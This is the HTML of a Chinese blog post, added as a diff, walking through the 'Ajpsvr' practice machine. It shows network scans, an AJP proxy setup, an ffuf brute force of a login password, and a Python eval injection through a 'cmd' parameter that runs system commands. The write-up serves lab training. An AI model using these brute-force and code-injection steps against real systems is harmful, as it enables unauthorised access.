@@ -1,0 +1,838 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334参考wp复现：https:&#x2F;&#x2F;7r1umphk.github.io&#x2F;post&#x2F;nei-bu-_ajpsvr.html 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;ajpsvr]└─# nmap -sn 192.168.2.0&#x2F;24     Starting Nmap 7.94SVN ( htt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ajpsvr">
+<meta property="og:url" content="http://miao-sec.github.io/Maze-sec/Ajpsvr/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334参考wp复现：https:&#x2F;&#x2F;7r1umphk.github.io&#x2F;post&#x2F;nei-bu-_ajpsvr.html 一、主机探测123456789101112131415┌──(root㉿kali)-[&#x2F;miao&#x2F;maze-sec&#x2F;ajpsvr]└─# nmap -sn 192.168.2.0&#x2F;24     Starting Nmap 7.94SVN ( htt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/23.jpg">
+<meta property="article:published_time" content="2025-07-21T14:36:06.000Z">
+<meta property="article:modified_time" content="2025-07-21T14:37:08.075Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="ajp服务，提权-apk">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/23.jpg">
+  
+  
+  
+  <title>Ajpsvr - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ajpsvr"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-21 22:36" pubdate>
+          2025年7月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Ajpsvr</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code><br>参考wp复现：<code>https://7r1umphk.github.io/post/nei-bu-_ajpsvr.html</code></p>
+<h1 id="一、主机探测"><a href="#一、主机探测" class="headerlink" title="一、主机探测"></a>一、主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.0014s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.0014s latency).<br>MAC Address: 08:00:27:72:CB:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.00037s latency).<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.22 seconds<br></code></pre></td></tr></table></figure>
+<p>靶机IP：<code>192.168.2.59</code></p>
+<h1 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap --min-rate 10000 -p- 192.168.2.59                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.00026s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8010/tcp open  xmpp<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 20.25 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口<code>22,80,8010</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,8010 192.168.2.59<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.0077s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 9.9 (protocol 2.0)<br>| ssh-hostkey: <br>|   256 <span class="hljs-built_in">fc</span>:b2:88:5d:09:d8:06:40:81:<span class="hljs-built_in">cd</span>:5a:5c:53:79:60:54 (ECDSA)<br>|_  256 5b:b9:4d:de:03:f0:ee:72:d3:e3:e9:9d:e8:f1:3f:bd (ED25519)<br>80/tcp   open  http    nginx<br>|_http-title: 403 Forbidden<br>8010/tcp open  xmpp?<br>| fingerprint-strings: <br>|   GenericLines: <br>|_    ajpy<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8010-TCP:V=7.94SVN%I=7%D=7/17%Time=68786573%P=x86_64-pc-linux-gnu%r<br>SF:(GenericLines,8,<span class="hljs-string">&quot;\x124\0\x04ajpy&quot;</span>);<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.78 seconds<br></code></pre></td></tr></table></figure>
+<p><code>80</code>显示403<br><code>8010</code>开放的协议是<code>xmpp</code></p>
+<h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# nmap -sU --top-ports 100 192.168.2.59                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-17 10:53 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.59<br>Host is up (0.0013s latency).<br>All 100 scanned ports on 192.168.2.59 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 54 closed udp ports (port-unreach), 46 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:E0:D2:BE (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 50.77 seconds<br></code></pre></td></tr></table></figure>
+<p>没有开放的端口</p>
+<h1 id="三、WEB渗透"><a href="#三、WEB渗透" class="headerlink" title="三、WEB渗透"></a>三、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>访问80端口，发现无法访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.59<br>&lt;html&gt;<br>&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;<br>&lt;body&gt;<br>&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;<br>&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.59 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.59<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak,md<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>Progress: 1323360 / 1323366 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>没有任何东西，转8010端口</p>
+<h2 id="2、8010端口"><a href="#2、8010端口" class="headerlink" title="2、8010端口"></a>2、8010端口</h2><p>访问8010端口，发现无法访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.59:8010     <br>curl: (1) Received HTTP/0.9 when not allowed<br></code></pre></td></tr></table></figure>
+
+<p>观察信息收集，发现8010端口可能开放着<code>AJP (Apache JServ Protocol)</code>服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">8010/tcp open  xmpp?<br>| fingerprint-strings: <br>|   GenericLines: <br>|_    ajpy<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port8010-TCP:V=7.94SVN%I=7%D=7/17%Time=68786573%P=x86_64-pc-linux-gnu%r<br>SF:(GenericLines,8,<span class="hljs-string">&quot;\x124\0\x04ajpy&quot;</span>);<br></code></pre></td></tr></table></figure>
+<h3 id="AJP服务"><a href="#AJP服务" class="headerlink" title="AJP服务"></a>AJP服务</h3><p><strong>什么是 AJP？</strong></p>
+<ul>
+<li>AJP服务是指基于Apache JServ Protocol（AJP）协议的应用服务，主要用于Web服务器与Servlet容器（如Tomcat）之间的高效通信。</li>
+<li>AJP是一种<strong>定向包协议</strong>，通过<strong>二进制格式</strong>传输数据（而非HTTP的纯文本），旨在提升Web服务器与应用服务器间的通信效率。它允许Web服务器（如Apache HTTP Server）将请求转发给后端的Servlet容器处理，常用于负载均衡或反向代理场景。&#96;</li>
+</ul>
+<p><strong>代理配置步骤：</strong></p>
+<ol>
+<li>启用Apache的相关代理模块<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt-get install apache2<br><span class="hljs-built_in">sudo</span> a2enmod proxy    <br><span class="hljs-built_in">sudo</span> a2enmod proxy_http<br><span class="hljs-built_in">sudo</span> a2enmod proxy_ajp        <br></code></pre></td></tr></table></figure></li>
+<li>创建一个新的 Apache 站点配置文件 <code>/etc/apache2/sites-available/ajp-proxy.conf</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">Listen 8000<br>&lt;VirtualHost *:8000&gt;<br>    ProxyPass / ajp://192.168.2.59:8010/<br>    ProxyPassReverse / ajp://192.168.2.59:8010/<br>&lt;/VirtualHost&gt;<br></code></pre></td></tr></table></figure></li>
+<li>启用该站点并重启 Apache 服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> a2ensite ajp-proxy.conf<br><span class="hljs-built_in">sudo</span> systemctl restart apache2<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>配置完成后，访问我们自己机器的 <code>http://127.0.0.1:8000</code> (或 <code>http://192.168.2.4:8000</code>) 就相当于在访问目标 <code>192.168.2.59:8010</code> 上的 Web 应用<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507212149037.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<h1 id="四、漏洞利用与初始访问"><a href="#四、漏洞利用与初始访问" class="headerlink" title="四、漏洞利用与初始访问"></a>四、漏洞利用与初始访问</h1><p>代理设置后，再次对代理后的地址进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.4:8000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt,html,bak,md<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.4:8000<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,txt,html,bak,md<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/login                (Status: 200) [Size: 21]<br>/test                 (Status: 200) [Size: 12]<br>/backdoor             (Status: 200) [Size: 9]<br>Progress: 1323360 / 1323366 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>找到三个路径：<code>/login</code>，<code>/test</code>，<code>/backdoor</code></p>
+<h2 id="1、登录页面爆破"><a href="#1、登录页面爆破" class="headerlink" title="1、登录页面爆破"></a>1、登录页面爆破</h2><p>访问<code>/login</code>发现需要一个参数<code>password</code>，并且长度为<code>5</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.4:8000/login?password=<span class="hljs-built_in">test</span> <br>Password length is 5 <br></code></pre></td></tr></table></figure>
+
+<p>提示我们需要爆破一个长度为 5 的密码。然而，直接使用常规字典爆破会遇到问题，因为后端对特殊字符的长度计算方式可能与我们预想的不同。正确的做法是对字典中的每一个密码进行 URL 编码。</p>
+<ol>
+<li>从 <code>rockyou.txt</code> 中筛选出所有长度为 5 的密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# grep -x <span class="hljs-string">&#x27;^.\&#123;5\&#125;$&#x27;</span> /usr/share/wordlists/rockyou.txt &gt; 5z.txt <br></code></pre></td></tr></table></figure></li>
+<li>使用 Python 对筛选后的字典进行 URL 编码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# python3 -c <span class="hljs-string">&#x27;import sys, urllib.parse; [print(urllib.parse.quote(line.strip())) for line in sys.stdin]&#x27;</span> &lt; 5z.txt &gt; 5z_u.txt<br></code></pre></td></tr></table></figure></li>
+<li>使用 <code>ffuf</code> 和编码后的字典进行爆破，并过滤掉返回内容为空的响应 (<code>--fs 0</code>)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# ffuf -u <span class="hljs-string">&quot;http://192.168.2.4:8000/login?password=FUZZ&quot;</span> -w 5z_u.txt --fs 0    <br>.....<br>%21%40%23%24%25         [Status: 200, Size: 25, Words: 1, Lines: 1, Duration: 3ms]<br>.....<br></code></pre></td></tr></table></figure></li>
+<li>找到一个有效密码<code>%21%40%23%24%25</code>，解码后为<code>!@#$%</code></li>
+</ol>
+<h2 id="2、后门与远程代码执行"><a href="#2、后门与远程代码执行" class="headerlink" title="2、后门与远程代码执行"></a>2、后门与远程代码执行</h2><p>用找到的密码访问登录页面，返回新的路径</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.4:8000/login?password=%21%40%23%24%25<br>/backdoooooooooooooooooor<br></code></pre></td></tr></table></figure>
+
+<p>访问路径<code>/backdoooooooooooooooooor</code>，并尝试传入<code>cmd</code>参数执行命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl http://192.168.2.4:8000/backdoooooooooooooooooor?cmd=<span class="hljs-built_in">id</span><br>&lt;built-in <span class="hljs-keyword">function</span> <span class="hljs-built_in">id</span>&gt; <br></code></pre></td></tr></table></figure>
+
+<p>返回结果 <code>&lt;built-in function id&gt;</code> 表明后端很可能使用了 Python 的 <code>eval()</code> 或类似函数来执行代码，并且没有导入 <code>os</code> 模块。为了执行系统命令，我们需要先导入 <code>os</code> 模块。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/maze-sec/ajpsvr]<br>└─# curl <span class="hljs-string">&#x27;http://192.168.2.4:8000/backdoooooooooooooooooor?cmd=__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span><br>uid=1000(welcome) gid=1000(welcome) <span class="hljs-built_in">groups</span>=1000(welcome)<br></code></pre></td></tr></table></figure>
+<p>成功执行</p>
